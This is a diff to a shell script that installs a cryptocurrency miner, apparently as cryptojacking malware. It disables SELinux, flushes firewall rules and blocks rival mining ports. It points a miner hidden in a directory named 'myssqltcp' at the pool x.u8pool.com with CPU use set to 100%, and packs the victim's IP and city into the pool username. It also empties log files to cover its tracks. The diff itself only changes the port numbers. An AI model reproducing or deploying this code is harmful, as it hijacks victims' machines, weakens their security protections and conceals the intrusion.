@@ -27,8 +27,8 @@ setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 iptables -F
 iptables -X
-iptables -A OUTPUT -p tcp --dport 13555 -j DROP
-iptables -A OUTPUT -p tcp --dport 13666 -j DROP
+iptables -A OUTPUT -p tcp --dport 13777 -j DROP
+iptables -A OUTPUT -p tcp --dport 13888 -j DROP
 service iptables reload
 
 # printing greetings
@@ -103,13 +103,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 13555 ))
+PORT=$(( 13777 ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
+if [ "$PORT" -lt "13777" -o "$PORT" -gt "13777" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -742,7 +742,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS"
 fi
 
-sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY'-'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
@@ -853,7 +853,7 @@ fi
 ls *.log | xargs -I x -n 1 sh -c "echo > x”
 
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
-grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
+grep -q "x.u8pool.com:13777" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' $HOME/myssqltcp/config.json
 EOL
 
 chmod 777 $HOME/myssqltcp/logserver.sh
